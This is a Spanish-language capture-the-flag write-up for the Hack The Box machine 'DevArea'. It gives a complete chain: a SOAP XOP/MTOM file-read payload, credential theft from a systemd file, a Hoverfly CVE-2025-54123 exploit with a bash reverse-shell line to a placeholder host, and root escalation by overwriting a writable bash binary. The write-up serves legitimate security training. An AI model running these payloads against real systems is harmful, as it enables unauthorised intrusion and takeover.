# HTB - DevArea Writeup

**Autor:** TRNNSK
**Dificultad:** Medium
**Sistema:** Linux

---

# Resumen

La máquina **DevArea** presenta una cadena de vulnerabilidades que debemos explotar para llegar al control total de root. Vamos a hacer uso de una vulnerabilidad de lectura de archivos locales a través de XOP/MTOM en un servicio SOAP (Apache CXF) para obtener credenciales, luego CVE-2025-54123 en Hoverfly para obtener una shell, y finalmente una escalada de privilegios mediante un binario `/usr/bin/bash` escribible combinado con sudo.

---

# Enumeración

## Escaneo inicial

```bash
nmap -sS -sV -sC -T4 10.129.23.129
```

### Resultados:

```
21/tcp   open  ftp     vsftpd 3.0.5
22/tcp   open  ssh     OpenSSH 9.6p1
80/tcp   open  http    Apache httpd 2.4.58
8080/tcp open  http    Jetty 9.4.27.v20200227
8500/tcp open  http    Golang net/http server (proxy)
8888/tcp open  http    Golang net/http server - Hoverfly Dashboard
```

---

# Análisis Inicial

## FTP Anónimo

El escaneo de nmap revela que el FTP tiene login anónimo habilitado. Al conectarnos encontramos un archivo de interés:

```bash
ftp 10.129.23.129
# usuario: anonymous / password: (vacío)
cd pub
get employee-service.jar
```

## Análisis del JAR

Descompilamos el archivo con jadx para analizar su contenido:

```bash
jadx employee-service.jar -d output/
strings employee-service.jar | grep -i "password\|secret\|api\|url\|endpoint"
```

Dentro del código descompilado encontramos una referencia a un servicio SOAP:

```
http://devarea.htb:8080/employeeservice?wsdl
```

---

# Vulnerabilidad: LFI via XOP/MTOM (Apache CXF)

## Identificación

Al acceder al WSDL del servicio encontramos una operación `submitReport` que acepta campos de tipo string. El servicio corre sobre Apache CXF con Jetty, el cual acepta peticiones MTOM (SOAP con adjuntos binarios).

El intento de XXE clásico con DTD fue bloqueado:
```
Error reading XMLStreamReader: Received event DTD, instead of START_ELEMENT
```

Sin embargo, el servicio acepta el estándar XOP (XML-binary Optimized Packaging), que permite incluir referencias a archivos externos sin usar DTD.

## Explotación

```bash
curl -s -X POST http://devarea.htb:8080/employeeservice \
  -H 'Content-Type: multipart/related; boundary=MIMEBoundary; type="application/xop+xml"; start="<root@example.com>"; start-info="text/xml"' \
  --data-binary @- << 'EOF'
--MIMEBoundary
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: binary
Content-ID: <root@example.com>

<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:tns="http://devarea.htb/"
               xmlns:xop="http://www.w3.org/2004/08/xop/include">
  <soap:Body>
    <tns:submitReport>
      <arg0>
        <confidential>false</confidential>
        <content>
          <xop:Include href="file:///etc/systemd/system/hoverfly.service"/>
        </content>
        <department>x</department>
        <employeeName>x</employeeName>
      </arg0>
    </tns:submitReport>
  </soap:Body>
</soap:Envelope>
--MIMEBoundary--
EOF
```

La respuesta devuelve el contenido del archivo codificado en base64. Para decodificarlo:

```bash
echo "BASE64_AQUI" | base64 -d
```

## Credenciales Obtenidas

Del archivo `/etc/systemd/system/hoverfly.service` obtenemos:

```ini
[Service]
User=dev_ryan
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
```

Credenciales de Hoverfly: `admin:O7IJ27MyyXiU`

---

# Explotación (Foothold): CVE-2025-54123

## Identificación

Hoverfly v1.11.3 (visible en el dashboard en puerto 8888) es vulnerable a command injection en el endpoint `/api/v2/hoverfly/middleware`. Los parámetros `binary` y `script` se pasan directamente a comandos del sistema sin sanitización.

## Explotación

```bash
git clone https://github.com/kasem545/CVE-2025-54123-Poc
cd CVE-2025-54123-Poc

# Listener en otra terminal
nc -lvnp 4444

# Lanzar exploit
python3 exploit.py -t http://devarea.htb:8888 \
  -u admin \
  -p O7IJ27MyyXiU \
  -c "bash -i >& /dev/tcp/TU_IP_TUN0/4444 0>&1"
```

Con esto obtenemos shell como `dev_ryan` y podemos recoger la flag de usuario:

```bash
cat /home/dev_ryan/user.txt
```

---

# Escalada de Privilegios

## Enumeración

```bash
sudo -l
```

### Resultado:

```
User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh
```

Adicionalmente, identificamos que `/usr/bin/bash` tiene permisos de escritura mundial:

```bash
ls -la /usr/bin/bash
-rwxrwxrwx 1 root root 1446024 Mar 31 2024 /usr/bin/bash
```

## Técnica: Bash Hijacking via SUID

`syswatch.sh` internamente llama a `/usr/bin/bash` para ejecutarse. Al tener permisos de escritura sobre ese binario, podemos reemplazarlo con un script malicioso que, cuando root lo ejecute via sudo, cree una copia SUID del bash real.

**Importante:** Hay que ejecutar todo desde una shell `sh` (no bash), para que al matar los procesos bash el archivo quede libre para sobreescribir.

Desde la shell del reverse shell (que usa `sh`):

```bash
# 1. Hacer backup del bash real
cp /usr/bin/bash /tmp/bash.bak

# 2. Matar procesos bash para liberar el archivo
killall bash

# 3. Sobreescribir /usr/bin/bash con script malicioso
cat > /usr/bin/bash << 'EOF'
#!/tmp/bash.bak
cp /tmp/bash.bak /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF

# 4. Ejecutar syswatch como root para disparar el script
sudo /opt/syswatch/syswatch.sh

# 5. Ejecutar el bash con SUID root
/tmp/rootbash -p

# 6. Verificar
id
# uid=0(root) gid=1001(dev_ryan) groups=1001(dev_ryan)
```

## ¿Por qué funciona?

- `syswatch.sh` llama `/usr/bin/bash` internamente cuando se ejecuta
- Como corre con `sudo`, el contexto es root
- Nuestro script malicioso en `/usr/bin/bash` usa `#!/tmp/bash.bak` como shebang para evitar loops y porque `/bin/bash` puede ser symlink a `/usr/bin/bash`
- Al ejecutarse como root, la copia `/tmp/rootbash` tiene dueño root
- El bit SUID (`4755`) hace que cualquiera que ejecute `/tmp/rootbash -p` obtenga privilegios de root

---

# Obtener la Flag

```bash
cat /root/root.txt
```

---

# TLDR MUCHO TEXTO

1. Escanear con Nmap
2. Descargar `employee-service.jar` del FTP anónimo
3. Analizar el JAR con jadx para encontrar el endpoint SOAP
4. Explotar LFI via XOP/MTOM para leer `/etc/systemd/system/hoverfly.service`
5. Obtener credenciales de Hoverfly del archivo de servicio
6. Explotar CVE-2025-54123 en Hoverfly para obtener shell como dev_ryan
7. Identificar `/usr/bin/bash` escribible y regla sudo en syswatch.sh
8. Reemplazar `/usr/bin/bash` con script malicioso desde shell sh
9. Ejecutar sudo syswatch.sh para crear `/tmp/rootbash` con SUID root
10. Ejecutar `/tmp/rootbash -p` para obtener shell root

---

# Conclusión

Esta máquina demuestra cómo:

- Los servicios SOAP pueden ser vulnerables a LFI a través de estándares legítimos como XOP/MTOM, incluso cuando el XXE clásico está bloqueado
- Los archivos de configuración de servicios systemd pueden exponer credenciales en texto plano
- Una versión desactualizada de Hoverfly permite RCE autenticado via inyección en el endpoint de middleware
- Permisos mal configurados en binarios del sistema (`/usr/bin/bash` escribible) combinados con reglas sudo permiten escalada completa a root

---

y ya
